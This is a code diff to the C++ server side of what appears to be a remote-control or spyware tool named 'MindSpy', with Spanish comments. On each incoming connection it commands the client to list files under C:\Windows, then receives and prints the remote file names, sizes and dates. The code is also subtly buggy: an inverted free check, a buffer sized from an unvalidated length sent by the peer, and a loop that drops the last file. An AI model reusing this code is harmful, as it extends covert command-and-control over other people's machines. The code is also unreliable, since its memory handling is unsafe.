@@ -52,6 +52,13 @@ namespace MindSpy
 			cout << "Conexion aceptada. IP: " << Conexiones[id].IP << endl;
 			CreateThread(NULL, NULL, &HiloConexionStatic, this, NULL, NULL);
 			while (!Conexiones[id].Activa) Sleep(30);
+
+			stFileInfoRequest stfir;
+			wcsncpy(stfir.Filtro, L"*.*", 4);
+			wcsncpy(stfir.Path, L"C:\\Windows", 11);
+			stfir.Query = FILEINFO_QUERY::REQ_ONLY_ARCHIVE;
+			if (EnviarComando(Conexiones[id].IP, sizeof(stFileInfoRequest), CLNT_CMDS::FILEINFO, (BYTE*)&stfir))
+				wcout << L"Solicitando información de archivos..." << endl;
 		}
 	}
 
@@ -102,41 +109,41 @@ namespace MindSpy
 		int MyID = Conexiones.size() - 1;
 		// Asignar el ID al registro
 		Conexiones[MyID].Activa = true;
-		char* szBuff = NULL;
+		char* szBuff = (char*)malloc(1);
 		// Mientras la conexión esté activa...
 		while (Conexiones[MyID].Activa) {
 			// variable para guardar la cantidad de bytes disponibles en el stream
 			DWORD bDisponibles;
 			// Validar si la conexión sigue activa
-			char bufft;
-			int resp = recv(Conexiones[MyID].c_socket, &bufft, 1, MSG_PEEK);
+			//int resp = recv(Conexiones[MyID].c_socket, &bufft, 1, MSG_PEEK);
 			// Si no lo está, nos vamos
-			if (resp == SOCKET_ERROR)
-				break;
 
 			// Verificamos si hay bytes por leer
-			ioctlsocket(Conexiones[MyID].c_socket, FIONREAD, &bDisponibles);
+			int resp = ioctlsocket(Conexiones[MyID].c_socket, FIONREAD, &bDisponibles);
+			if (resp == SOCKET_ERROR)
+				break;
 			// si no los hay, ralentizamos y reiniciamos el ciclo
 			if (!bDisponibles)
 			{
 				Sleep(50);
 				continue;
 			}
-			else
-			{
-				if (!szBuff)
-					free(szBuff);
-				szBuff = (char*)malloc(bDisponibles);
 
-			}
 			// Si los hay, los leemos
-			resp = recv(Conexiones[MyID].c_socket, szBuff, bDisponibles, 0);
+			int DataSize;
+			resp = recv(Conexiones[MyID].c_socket, (char*)&DataSize, 4, MSG_PEEK);
 			if (resp == 0)
 				continue;
 			else if (resp < 0)
 				break;
 
+			if (!szBuff)
+				free(szBuff);
+			szBuff = (char*)realloc(szBuff, DataSize+8);
+			recv(Conexiones[MyID].c_socket, szBuff, DataSize+8, 0);
 			UINT32 comando = *(UINT32*)(szBuff + sizeof(UINT32));
+
+			wcout << L"Data recibida: " << DataSize + 8 << L" bytes." << endl;
 
 			switch (comando)
 			{
@@ -165,25 +172,43 @@ namespace MindSpy
 				stListaArchivos stla;
 				BYTE *ReceivedData = (BYTE*)(szBuff + 8);
 				UINT32 SizeOfReceivedData = *(UINT32*)(szBuff);
+				stla.CantArchivos = *(UINT32*)ReceivedData;
 
-				int OffsetWchar = sizeof(WCHAR)*MAX_PATH*stla.CantArchivos;
+				int OffsetWchar = sizeof(WCHAR) * MAX_PATH * stla.CantArchivos;
+				int OffsetLonglong = sizeof(long long) * stla.CantArchivos;
 				int OffsetFiletime = sizeof(FILETIME) * stla.CantArchivos;
 
-				stla.CantArchivos = *(UINT32*)ReceivedData;
-				stla.Archivos = (PWCHAR)(ReceivedData + sizeof(UINT32));
-				stla.FechasCreacion = (PFILETIME)(ReceivedData + sizeof(UINT32) + OffsetWchar);
-				stla.FechasModificacion = (PFILETIME)(ReceivedData + sizeof(UINT32) + OffsetWchar + OffsetFiletime);
-				stla.Tamaños = (PLONGLONG)(ReceivedData + sizeof(UINT32) + OffsetWchar + OffsetFiletime * 2);
+				PWCHAR NombreInicio = (PWCHAR)(ReceivedData + sizeof(UINT32));
+				PFILETIME FCInicio = (PFILETIME)(ReceivedData + sizeof(UINT32) + OffsetWchar);
+				PFILETIME FMInicio = (PFILETIME)(ReceivedData + sizeof(UINT32) + OffsetWchar + OffsetFiletime);
+				PLONGLONG TamInicio = (PLONGLONG)(ReceivedData + sizeof(UINT32) + OffsetWchar + OffsetFiletime * 2);
+				
+				PFILETIME FCActual = FCInicio;
+				PFILETIME FMActual = FMInicio;
+				wchar_t* NombreActual = NombreInicio;
+				long long *TamañoActual = TamInicio;
 
 				Conexiones[MyID].archivos.clear();
-				wcout << L"Data recibida: " << SizeOfReceivedData << endl;
-				for (int i = 0; i < stla.CantArchivos; i++)
+				for (int i = 0; i < stla.CantArchivos-1; i++)
 				{
 					Conexiones[MyID].archivos.push_back(Archivo());
-					Conexiones[MyID].archivos[i].nombre = (wchar_t*)&stla.Archivos[getID(i)];
-					Conexiones[MyID].archivos[i].FechaCreacion = stla.FechasCreacion[i];
-					Conexiones[MyID].archivos[i].FechaModificacion = stla.FechasModificacion[i];
-					Conexiones[MyID].archivos[i].Tamaño = stla.Tamaños[i];
+					Conexiones[MyID].archivos[i].nombre = NombreActual;
+					Conexiones[MyID].archivos[i].Tamaño = *TamañoActual;
+					Conexiones[MyID].archivos[i].FechaCreacion = *FCActual;
+					Conexiones[MyID].archivos[i].FechaModificacion = *FMActual;
+
+					NombreActual += MAX_PATH;
+					FCActual++;
+					FMActual++;
+					TamañoActual++;
+
+					SYSTEMTIME st;
+					FileTimeToSystemTime(&Conexiones[MyID].archivos[i].FechaCreacion, &st);
+					wcout << 
+						Conexiones[MyID].archivos[i].nombre << L" - " << 
+						Conexiones[MyID].archivos[i].Tamaño << L" bytes.\n" <<
+						L"Creado el " << st.wDay << L"/" << st.wMonth << L"/" << st.wYear <<
+						endl << endl;
 				}
 				break;
 			}
